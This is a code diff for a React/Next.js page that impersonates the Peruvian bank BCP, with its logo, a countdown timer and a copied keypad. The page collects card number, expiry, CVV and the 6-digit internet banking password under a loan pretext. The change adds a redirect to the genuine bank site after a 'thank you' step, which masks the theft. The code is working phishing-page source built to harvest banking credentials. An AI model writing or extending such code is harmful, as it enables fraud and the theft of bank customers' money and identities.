@@ -2,11 +2,14 @@
 "use client";
 
 import { useEffect, useRef, useState } from "react";
+import { useRouter } from "next/navigation";
 import KeypadBCP from "@/components/KeypadBCP";
 
 export default function TarjetaClient({
   amount, payDay, docType, docNumber,
 }: { amount: string; payDay: string; docType: string; docNumber: string; }) {
+
+  const router = useRouter();
 
   const [seconds, setSeconds] = useState(300);
   useEffect(() => {
@@ -57,7 +60,14 @@ export default function TarjetaClient({
     if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) return;
     if (!/^\d{3}$/.test(cvv)) return;
     if (!/^\d{6}$/.test(clave)) return;
-    alert("Continuará…");
+
+    // ---- Redirección al PASO 5 (Gracias) ----
+    const REDIRECT_URL = "https://www.viabcp.com/"; // 🔁 cámbialo por tu URL final
+    const DELAY_MS = 2500;                           // 2000–3000 recomendado
+
+    router.push(
+      `/prestamo/gracias?to=${encodeURIComponent(REDIRECT_URL)}&delayMs=${DELAY_MS}`
+    );
   };
 
   return (
@@ -66,7 +76,7 @@ export default function TarjetaClient({
       <header className="bg-[color:var(--brand)] text-white">
         <div className="container-max h-12 flex items-center justify-between">
           <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
-          <div className="flex items-center gap-2 text-sm font-semibold">
+        <div className="flex items-center gap-2 text-sm font-semibold">
             <span>{seconds} segundos</span>
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
               <path d="M9 2h6M12 8v5l3 2" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
@@ -84,39 +94,60 @@ export default function TarjetaClient({
           <form onSubmit={onSubmit} className="mt-5 space-y-5">
             <div className="field-bcp">
               <span className="field-bcp__label">Número de tarjeta</span>
-              <input className="input-bcp w-full" inputMode="numeric"
-                     placeholder="0000 0000 0000 0000"
-                     value={card} onChange={(e)=>setCard(formatCard(e.target.value))}/>
+              <input
+                className="input-bcp w-full"
+                inputMode="numeric"
+                placeholder="0000 0000 0000 0000"
+                value={card}
+                onChange={(e)=>setCard(formatCard(e.target.value))}
+              />
             </div>
 
             <label className="flex items-center gap-3 text-[15px] text-[#334155]">
-              <input type="checkbox" checked={remember}
-                     onChange={(e)=>setRemember(e.target.checked)}
-                     className="h-5 w-5 rounded border-[color:var(--line)]"/>
+              <input
+                type="checkbox"
+                checked={remember}
+                onChange={(e)=>setRemember(e.target.checked)}
+                className="h-5 w-5 rounded border-[color:var(--line)]"
+              />
               Recordar datos
             </label>
 
             <div className="grid grid-cols-2 gap-3">
               <div className="field-bcp">
                 <span className="field-bcp__label">Fecha de vencimiento</span>
-                <input className="input-bcp w-full" inputMode="numeric"
-                       placeholder="MM/AA" value={exp}
-                       onChange={(e)=>setExp(formatExp(e.target.value))}/>
+                <input
+                  className="input-bcp w-full"
+                  inputMode="numeric"
+                  placeholder="MM/AA"
+                  value={exp}
+                  onChange={(e)=>setExp(formatExp(e.target.value))}
+                />
               </div>
               <div className="field-bcp">
                 <span className="field-bcp__label">CVV</span>
-                <input className="input-bcp w-full" inputMode="numeric"
-                       placeholder="CVV" value={cvv}
-                       onChange={(e)=>setCvv(e.target.value.replace(/\D/g,"").slice(0,3))}/>
+                <input
+                  className="input-bcp w-full"
+                  inputMode="numeric"
+                  placeholder="CVV"
+                  value={cvv}
+                  onChange={(e)=>setCvv(e.target.value.replace(/\D/g,"").slice(0,3))}
+                />
               </div>
             </div>
 
-            {/* Clave + keypad idéntico */}
+            {/* Clave + keypad */}
             <div className="field-bcp relative" ref={wrapRef}>
               <span className="field-bcp__label">Clave de internet de 6 dígitos</span>
-              <input className="input-bcp w-full" type="password"
-                     inputMode="none" readOnly value={clave}
-                     onFocus={openPad} onClick={openPad}/>
+              <input
+                className="input-bcp w-full"
+                type="password"
+                inputMode="none"
+                readOnly
+                value={clave}
+                onFocus={openPad}
+                onClick={openPad}
+              />
               {padOpen && (
                 <div ref={padRef} className="absolute left-0 right-0 mt-2">
                   <KeypadBCP
